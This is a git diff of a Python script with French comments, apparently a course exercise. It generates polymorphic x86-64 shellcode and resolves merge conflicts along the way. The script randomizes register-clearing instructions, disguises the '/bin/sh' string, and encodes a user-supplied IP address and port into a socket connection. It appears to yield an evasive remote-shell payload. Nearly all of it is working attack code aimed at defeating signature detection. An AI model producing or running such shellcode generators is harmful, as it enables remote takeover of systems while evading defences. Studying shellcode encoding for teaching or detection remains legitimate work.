@@ -5,7 +5,8 @@ import ipaddress
 rand_ip = ""
 # Définir les arguments de ligne de commande
 parser = argparse.ArgumentParser()
-parser.add_argument('-ip', '--ip-address', required=False, help='Adresse IP à convertir en hexadécimal')
+parser.add_argument('-ip', '--ip-address', help='Adresse IP à convertir en hexadécimal')
+parser.add_argument('-p', '--ports', help='Port a utiliser')
 
 # Analyser les arguments de ligne de commande
 args = parser.parse_args()
@@ -13,14 +14,9 @@ args = parser.parse_args()
 #global shellcode
 shellcode = ""
 
-
-def xor (registre, shellcode):		
-<<<<<<< HEAD
+def xor (registre, shellcode):	
+	# Tableau contenant les différentes instructions xor 		
 	
-	# Tableau contenant les instructions xor avec différents registres		
-=======
-		
->>>>>>> 7b5b9a1d1c4749d5f1fd92c88ba9eba9473bae1e
 	xor_rax = ['4831c0', '4829c0', '4d31e44994', '4d31e4415458'] #xor rax, rax // sub rax, rax // xor  r12, r12 | xchg rax, r12 // xor  r12, r12 | push r12 | pop  rax
 	xor_rbx = ['4831db', '4829DB', '4d31e44c87e3', '4d31e441545b']
 	xor_rcx = ['4831c9', '4829C9', '4d31e44c87e1', '4d31e4415459']
@@ -43,12 +39,8 @@ def xor (registre, shellcode):
 
 	return shellcode
 
-<<<<<<< HEAD
-
-# Fonction qui renvoie la valeur hexadécimale pour les instructions mov en fonction du registre
-=======
->>>>>>> 7b5b9a1d1c4749d5f1fd92c88ba9eba9473bae1e
 def mov_hex(register) :
+	# Fonction qui renvoie la valeur hexadécimale pour les instructions mov en fonction du registre
 
 	if register == 'al':
 		return 'b0'
@@ -58,20 +50,17 @@ def mov_hex(register) :
 		return 'b2'
 	
 def add_hex(register) :
-			
+	# Fonction qui renvoie la valeur hexadécimale pour les instructions add en fonction du registre	
+		
 	if register == 'al':
 		return '04'
 	if register == 'bl':
 		return '80c3'
 	if register == 'dl':
 		return '80c2'
-<<<<<<< HEAD
-
-# Fonction qui renvoie la valeur hexadécimale pour les instructions sub en fonction du registre		
-=======
 		
->>>>>>> 7b5b9a1d1c4749d5f1fd92c88ba9eba9473bae1e
 def sub_hex(register) :
+	# Fonction qui renvoie la valeur hexadécimale pour les instructions sub en fonction du registre		
 	
 	if register == 'al':
 		return '2c'
@@ -81,6 +70,7 @@ def sub_hex(register) :
 		return '80ea'
 		
 def pop(register) :
+	# Fonction qui renvoie la valeur hexadécimale pour les instructions pop en fonction du registre	
 	
 	if register == 'al':
 		return '6658' 
@@ -90,9 +80,11 @@ def pop(register) :
 		return '665a'
 
 def mov_register_decimal(register, value):
+	# Fonction qui randomize les mov reg, num		
+	
 	reg = ""
 	methode = random.randint(1, 2)
-	#methode = 1
+	#Deux methode de randomization
 	if methode == 1:
 		reg += '6a'
 		reg += value
@@ -106,48 +98,55 @@ def mov_register_decimal(register, value):
 		reg += value
 	return reg 
 	
-def bin_bash():
+def bin_bash() :
+	#Fonction randomize /bin/sh
+
 	code = ""
 	rand = str(random.randint(10, 255))
+	bash = '0x68732f6e69622f2f'
 	# Converti cette chaîne en un entier hexadécimal, puis ajouter le nombre aléatoire généré précédemment
-	bash = '0x68732f6e69622f2f' # '/bin/sh' en ASCII hexadécimal
 	tmp = int(bash, 16) + int(rand)
 	# Convertir le résultat en little-endian
 	little_endian = hex(int.from_bytes(bytes.fromhex(hex(tmp)[2:]), byteorder='little'))
-	code += '48bb' # mov rbx, immediate
-	code += little_endian[2:] 
-	code += '4d31e4' # xor r12, r12
+	code += '48bb'
+	code += little_endian[2:]
+	code += '4d31e4' #xor r12, r12
 	code += '41b4' # mov, r12b
-	code += hex(int(rand))[2:] # La valeur du registre r12b
-	code += '4c29e3' # sub rbx, r12
+	code += hex(int(rand))[2:]
+	code += '4c29e3' #sub rbx, r12
 	return code
 	
 def ip_polymorpeher(args):
+	#Fonction qui permet de choisir une adresse ip souhaitée et de la randomizer
+	
 	code = ""
 	# Convertir l'adresse IP en hexadécimal
 	ip_address_obj = ipaddress.IPv4Address(args.ip_address)
 	hex_address = hex(int(ip_address_obj))
-	print(hex_address)
-
-	rand_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
+	
+	#Crée une adresse ip aléatoire pour randomizer avec celle d'origine
+	rand_ip = '.'.join(str(random.randint(0, 99)) for _ in range(4))
 	ip_address_obj = ipaddress.IPv4Address(rand_ip)
 	rand_ip = hex(int(ip_address_obj))
-
-	print(rand_ip)
-
 	tmp = hex(int(hex_address, 16) + int(rand_ip, 16))
-	code += '48c7c6'
-	print('tmp = ' + tmp)
-	little_endian = hex(int.from_bytes(bytes.fromhex(tmp[2:]), byteorder='little'))
-	print('endianned = ' + little_endian)
-	code += little_endian[2:]
-	little_endian_rand = hex(int.from_bytes(bytes.fromhex(rand_ip[2:]), byteorder='little'))
+	code += 'be'
+	code += tmp[2:]
 	code += '49c7c4'
-	code += little_endian_rand[2:]
+	code += hex(int(rand_ip, 16))[2:]
 	tmp2 = int(tmp, 16) - int(rand_ip, 16)
 	code += '4c29e6'
-	print(hex(tmp2))
-	print(code)
+	code += '56' #push du prof
+	
+	return code
+
+def ports(args):
+	#Fonction qui permet de choisir le port
+
+	code = ""
+	port = args.ports
+	hex_port = hex(int(port))
+	code += '6668'
+	code += hex_port[2:]
 	return code
 
 def shellcodize(s):
@@ -187,12 +186,9 @@ shellcode = xor('rbx', shellcode)
 
 shellcode += '53' #push rbx
 
-#shellcode += 'be80ffff20' #mov esi, 0x020ffff80
-
-#shellcode += '81ee01ffff10' #sub esi, 0x010ffff01
 shellcode += ip_polymorpeher(args)
 
-shellcode += '6668231d' #push word 0x1d23
+shellcode += ports(args)
 
 shellcode += '666a02' #push word 0x02 
 
@@ -253,5 +249,7 @@ shellcode += mov_register_decimal('al', '3c')
 shellcode += '0f05' #syscall
 
 
-
 print(shellcodize(shellcode))
+
+
+
